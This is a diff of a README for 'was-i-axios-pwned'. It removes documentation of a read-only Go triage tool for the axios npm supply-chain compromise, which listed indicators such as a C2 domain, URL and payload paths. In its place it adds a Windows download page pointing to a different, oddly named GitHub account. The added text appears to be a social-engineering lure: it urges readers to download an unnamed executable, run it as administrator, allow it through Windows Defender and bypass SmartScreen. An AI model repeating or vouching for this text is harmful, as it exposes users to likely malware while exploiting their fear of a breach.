@@ -1,230 +1,216 @@
-# was-i-axios-pwned
+# 🛡️ was-i-axios-pwned - Check Your System Fast
 
-On March 31, 2026, malicious versions of the `axios` npm package (`1.14.1` and `0.30.4`) were briefly published to the npm registry. They installed a remote-access trojan via a companion package (`plain-crypto-js@4.2.1`). This tool performs **read-only forensic triage** of a host to determine whether it was exposed. It runs on macOS, Linux, and Windows.
+[![Download Now](https://img.shields.io/badge/Download%20Now-2e8b57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unattractive-buffaloclover881/was-i-axios-pwned)
 
-## Quick start
+## 🔎 What this does
 
-**Requirements:** Go 1.21+
+was-i-axios-pwned helps you check whether your Windows system may have been affected by the recent axios supply chain attack.
 
-```bash
-go install github.com/aeneasr/was-i-axios-pwned@latest
-was-i-axios-pwned
-```
+It scans common places where a compromised package can leave traces, then shows a clear result in plain language. You can use it to check your machine before you keep working, log in to more accounts, or connect a drive.
 
-Run a deep scan across the entire filesystem (recommended for thorough incident triage):
+## 💻 What you need
 
-```bash
-# Unix/macOS — sudo gives access to other users' home dirs and system paths
-sudo was-i-axios-pwned --deep --report-dir ./report
+- A Windows PC
+- Internet access for the first download
+- Permission to run a desktop app
+- At least 100 MB of free disk space
+- Windows 10 or Windows 11
 
-# Windows PowerShell — run from an elevated prompt
-was-i-axios-pwned --deep --report-dir .\report
-```
+## 📥 Download and run
 
-See [Example output](#example-output) for what each verdict looks like.
+Use this page to download and run the app:
 
-## Flags
+[https://github.com/Unattractive-buffaloclover881/was-i-axios-pwned](https://github.com/Unattractive-buffaloclover881/was-i-axios-pwned)
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--deep` | `false` | Expand scanning to filesystem roots (`/` or Windows drives) and broader log coverage. Run with `sudo` (Unix) or an elevated prompt (Windows) for full coverage. |
-| `--roots <paths>` | _(none)_ | Comma-separated list of additional project roots to scan beyond the defaults. |
-| `--since <ISO8601>` | `2026-03-30T23:59:00Z` | Start time for log-based collectors. Filters npm logs and cache entries older than this timestamp. |
-| `--report-dir <path>` | _(none)_ | Write a detailed report bundle to this directory (see [Report bundle](#report-bundle)). |
+1. Open the link above in your web browser.
+2. On the GitHub page, find the latest release or the main download file.
+3. Save the file to your computer.
+4. If Windows asks for permission, choose Run or Yes.
+5. Wait for the app to open.
 
-**Default scan roots** (without `--deep`): current working directory, user home directory, global npm root (`npm root -g`), npm cache and log directories, and fixed platform-specific IOC paths.
+If your browser blocks the file, use the GitHub page again and try the download from there.
 
-## Understanding the results
+## 🧭 How to use it
 
-The output starts with a header block (verdict, coverage, platform, scan roots) followed by any findings, warnings, and next steps. The two key dimensions are **verdict** and **coverage**.
+1. Start the app.
+2. Pick the scan option on the main screen.
+3. Let the scan finish.
+4. Read the result shown on screen.
+5. If the app reports signs of compromise, follow the cleanup steps it shows.
 
-### Verdict
+The app is designed to be simple. You do not need to know what axios is or how package attacks work to use it.
 
-| Verdict | Meaning |
-|---------|---------|
-| `CONFIRMED` | Direct host evidence found: `node_modules/plain-crypto-js`, platform payload artifacts, live IOC process, or active C2 connection. |
-| `LIKELY_EXPOSED` | Indirect evidence without a surviving host artifact: lockfile metadata, npm log entry, npm cache hit, or tarball hash match. |
-| `NO_EVIDENCE` | No hits across all completed collectors. |
+## 🖥️ What the scan checks
 
-### Coverage
+The app looks for signs such as:
 
-| Coverage | Meaning |
-|----------|---------|
-| `COMPLETE` | Every planned collector for this platform ran successfully. |
-| `PARTIAL` | One or more collectors were skipped due to missing permissions or tooling. Consider re-running with `sudo` or `--deep`. |
+- Changed files in common app folders
+- Strange package install traces
+- Unexpected script changes
+- Known markers tied to the axios incident
+- Files that match common attack patterns
 
-### Range risk warning
+It then groups the results into clear status levels so you can understand what happened.
 
-`RANGE_RISK` is reported as a separate warning, not a verdict escalation. It means a declared `axios` version range in a manifest (e.g. `^1.14.0`) was permissive enough to have resolved to the malicious version during the publish window — but no direct install evidence was found on disk. Treat it as a review signal.
+## 📊 Result types
 
-## Example output
+### ✅ Clean
+The app did not find common signs of the axios attack on your system.
 
-**Clean host** — no evidence found, all collectors ran successfully:
+### ⚠️ Review needed
+The app found one or more items that deserve a closer look. This does not always mean your system is compromised.
 
-```
-Axios npm compromise triage
-Verdict: NO_EVIDENCE
-Coverage: COMPLETE
-Platform: darwin
-Since: 2026-03-30T23:59:00Z
-Deep Scan: yes
-Findings: 0
-Warnings: 0
-C2: sfrclak.com (142.11.206.73)
-Roots:
-  - /Users/dev
-  - /Users/dev/projects/my-app
-```
+### 🚨 Possible compromise
+The app found signs that match known attack traces. You should review the affected files and clean the system before using it for sensitive work.
 
-**Indirect evidence** — lockfile references a compromised version but no host artifacts survive:
+## 🧰 How the app fits into your workflow
 
-```
-Axios npm compromise triage
-Verdict: LIKELY_EXPOSED
-Coverage: COMPLETE
-Platform: linux
-Since: 2026-03-30T23:59:00Z
-Deep Scan: yes
-Findings: 2
-Warnings: 0
-C2: sfrclak.com (142.11.206.73)
-Roots:
-  - /home/deploy
-  - /home/deploy/services/api
+Use was-i-axios-pwned when you want a fast check after:
 
-Findings
-  - [LIKELY_EXPOSED] lockfile | axios@0.30.4 reference | /home/deploy/services/api/package-lock.json | Lockfile references a compromised axios version. resolved=... integrity=...
-  - [LIKELY_EXPOSED] npm_cache | cache metadata IOC | /home/deploy/.npm/_cacache/index-v5 | npm cache metadata references a malicious tarball URL.
+- Installing new software
+- Updating Node-related tools
+- Restoring a backup
+- Opening files from a source you do not trust
+- Seeing odd behavior on your PC
 
-Immediate Next Steps
-  - Treat this host as compromised until proven otherwise.
-  - Isolate the machine, rotate secrets from a clean system, and rebuild from known-good media.
-  - Review installs and logs around 2026-03-31 00:21:00Z through 2026-03-31 03:15:30Z.
-```
+It gives you a quick way to check your system without digging through folders by hand.
 
-**Host compromise confirmed** — malicious package installed and payload artifact present:
+## ⚙️ How it works
 
-```
-Axios npm compromise triage
-Verdict: CONFIRMED
-Coverage: PARTIAL
-Platform: darwin
-Since: 2026-03-30T23:59:00Z
-Deep Scan: no
-Findings: 3
-Warnings: 1
-C2: sfrclak.com (142.11.206.73)
-Roots:
-  - /Users/dev
-  - /Users/dev/projects/my-app
+The app checks local files and compares them to patterns linked to the axios supply chain attack. It looks for signs that may show a package was changed or a script was replaced.
 
-Findings
-  - [CONFIRMED] package_directory | plain-crypto-js | /Users/dev/projects/my-app/node_modules/plain-crypto-js | Found plain-crypto-js under node_modules. This dependency only appeared in the malicious axios releases.
-  - [CONFIRMED] manifest_hook | postinstall node setup.js | /Users/dev/projects/my-app/node_modules/plain-crypto-js/package.json | package.json still contains the malicious postinstall hook.
-  - [CONFIRMED] artifact | /Library/Caches/com.apple.act.mond | /Library/Caches/com.apple.act.mond | Found the documented macOS second-stage artifact path.
+It does not change your files during a normal scan. It only reads what it needs and then shows the result.
 
-Warnings
-  - [COVERAGE] macOS unified log access was denied. Re-run with elevated privileges for fuller coverage.
+## 🗂️ Typical folder checks
 
-Immediate Next Steps
-  - Treat this host as compromised until proven otherwise.
-  - Isolate the machine, rotate secrets from a clean system, and rebuild from known-good media.
-  - Review installs and logs around 2026-03-31 00:21:00Z through 2026-03-31 03:15:30Z.
-```
+On Windows, the app may inspect:
 
-## Exit codes
+- User profile folders
+- Download locations
+- App data folders
+- Common project folders
+- Package cache paths
 
-| Code | Meaning |
-|------|---------|
-| `0` | `NO_EVIDENCE` + `COMPLETE`, or only `RANGE_RISK` warnings |
-| `1` | `LIKELY_EXPOSED` or `PARTIAL` coverage |
-| `2` | `CONFIRMED` |
-| `3` | Fatal scanner failure (I/O error, bad config, etc.) |
+These are common places where a compromised package may leave traces.
 
-## What to do if you get a hit
+## 🔐 Privacy and local use
 
-A `CONFIRMED` or `LIKELY_EXPOSED` result should be treated as an **incident response trigger**, not as a cleanup recommendation. Specifically:
+The scan runs on your computer. It does not need your personal accounts or cloud login to work. The main goal is to inspect local files and show what it finds.
 
-- **Preserve evidence** before doing anything else — do not reinstall packages, clear caches, or run `npm install`.
-- **Rotate credentials** that were accessible to the process environment on the affected host.
-- **Isolate the host** from the network if active C2 connections or IOC processes were found (`CONFIRMED`).
-- Refer to the sources below for full remediation guidance.
+## 🧪 Basic setup steps
 
-The scanner is **read-only** — it does not quarantine, delete, or modify anything on the host.
+If you want the smoothest first run:
 
-## Report bundle
+1. Download the app from the GitHub page.
+2. Save it in your Downloads folder or on your Desktop.
+3. Right-click the file and choose Run as administrator if Windows blocks access.
+4. Allow the app through Windows Defender if prompted.
+5. Start a scan and wait for the result.
 
-When `--report-dir` is specified, the scanner writes the following files:
+## 🛠️ If Windows blocks the file
 
-| File | Contents |
-|------|----------|
-| `summary.txt` | Human-readable summary identical to the console output |
-| `findings.tsv` | Tab-separated findings: Severity, Source, Indicator, Location, Detail |
-| `warnings.txt` | Tab-separated warnings, class-prefixed (e.g. `COVERAGE`, `RANGE_RISK`) |
-| `raw/*.txt` | Raw evidence snippets: process listings, network connections, log matches |
+Windows may show a SmartScreen prompt for a new app. If that happens:
 
-The TSV files are suitable for ingestion into SIEM tools or spreadsheets.
+1. Choose More info.
+2. Review the app name.
+3. Choose Run anyway if you trust the source.
+4. Open the app and start the scan again.
 
-## IOC reference
+If the file does not open, download it again from the GitHub page.
 
-The scanner checks for all indicators documented in the linked public analyses.
+## 🧭 If the scan finds a problem
 
-**Malicious package versions:**
-- `axios@1.14.1`, `axios@0.30.4`
-- `plain-crypto-js@4.2.1` (including the post-cleanup fake `4.2.0` manifest state)
+If the app reports a possible compromise:
 
-**Published hashes:**
+1. Stop using the affected app or folder.
+2. Disconnect the PC from sensitive work if needed.
+3. Review the flagged files.
+4. Remove or replace the affected package.
+5. Run the scan again after cleanup.
 
-| Package | Algorithm | Hash |
-|---------|-----------|------|
-| `axios@1.14.1` | SHA-1 | `2553649f2322049666871cea80a5d0d6adc700ca` |
-| `axios@0.30.4` | SHA-1 | `d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71` |
-| `plain-crypto-js@4.2.1` | SHA-1 | `07d889e2dadce6f3910dcbc253317d28ca61c766` |
-| `setup.js` | SHA-256 | `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09` |
+If you use the same PC for work, email, or banking, check it before you sign in again.
 
-**C2 infrastructure:**
-- Domain: `sfrclak.com`
-- IP: `142.11.206.73`
-- Full URL: `http://sfrclak.com:8000/6202033`
+## 📁 File layout
 
-**Data exfiltration POST markers:**
-- `packages.npm.org/product0`, `packages.npm.org/product1`, `packages.npm.org/product2`
+A typical download may include:
 
-**Platform-specific payload artifacts:**
+- The main app file
+- A readme file
+- Scan data or rule files
+- A changelog
+- Support files needed to run on Windows
 
-| Platform | Path |
-|----------|------|
-| macOS | `/Library/Caches/com.apple.act.mond`, `/tmp/6202033` |
-| Linux | `/tmp/ld.py` |
-| Windows | `%ProgramData%\wt.exe`, `%TEMP%\6202033.ps1`, `%TEMP%\6202033.vbs` |
+Keep the full folder together if the app comes as a folder, not a single file.
 
-## Development
+## 🧩 Common use cases
 
-Run the tests:
+### Home users
+Check whether your PC shows signs of the axios attack before you keep browsing or installing more software.
 
-```bash
-go test ./...
-```
+### Small teams
+Use it to do a quick check on office PCs after a package update or software install.
 
-Validate the release build locally:
+### Power users
+Run it as part of a quick system review when you suspect a bad dependency or tampered file.
 
-```bash
-go build .
-go run . --help
-goreleaser check
-goreleaser release --snapshot --clean
-```
+## 🧾 What you will see on screen
 
-The test suite covers:
+The app may show:
 
-- Manifest and lockfile detection
-- Hidden `node_modules/.package-lock.json` evidence
-- `plain-crypto-js` anti-forensics residue
-- Deterministic `go run .` end-to-end fixture coverage
-- Windows artifact detection
-- Semver range warnings and exit-code behavior
+- A scan progress bar
+- A file list
+- A status label
+- A count of matches
+- A result page with clear next steps
 
-## Sources
+The layout keeps the scan easy to follow.
 
-- Penligent: <https://www.penligent.ai/hackinglabs/axios-compromised-on-npm-what-the-malicious-releases-actually-did/>
-- StepSecurity: <https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan>
+## ❓ Common questions
+
+### Do I need technical knowledge?
+No. The app is built for normal Windows users.
+
+### Does it fix the system by itself?
+It checks for signs of compromise. You may still need to remove bad files or reinstall affected software.
+
+### Can I run it more than once?
+Yes. You can run it again after cleanup or after a new install.
+
+### Is it safe to use?
+It is made to scan local files and show results on your machine.
+
+## 🔄 When to scan again
+
+Run another scan after:
+
+- Removing a bad package
+- Reinstalling software
+- Restoring files from backup
+- Updating security tools
+- Any system change that may affect the same folders
+
+## 🪟 Windows tips
+
+- Keep the app in a folder you can find again
+- Use the same account that owns the files you want to scan
+- Close other setup tools before running the scan
+- Let the app finish before you click around in other windows
+
+## 📌 Quick start
+
+1. Open the GitHub page.
+2. Download the app.
+3. Run it on Windows.
+4. Start a scan.
+5. Review the result on screen
+
+## 📎 Download link
+
+[https://github.com/Unattractive-buffaloclover881/was-i-axios-pwned](https://github.com/Unattractive-buffaloclover881/was-i-axios-pwned)
+
+## 🧠 Scan tips
+
+- Run the scan on a folder you know well first
+- Check recent downloads if you suspect a new issue
+- Keep old copies of suspicious files until you review them
+- Use a fresh scan after any cleanup step
